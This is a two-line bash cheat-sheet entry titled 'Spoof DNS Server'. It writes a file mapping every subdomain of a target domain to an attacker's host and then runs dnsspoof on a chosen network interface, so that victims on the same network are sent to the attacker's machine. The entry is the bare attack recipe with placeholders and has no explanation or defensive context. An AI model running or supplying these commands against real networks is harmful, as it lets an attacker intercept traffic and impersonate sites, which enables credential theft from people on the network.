# Spoof DNS Server
```bash
echo "<Attack Host> *.<Domain Name>.com" > dns
dnsspoof -i <Interface> -f dns
```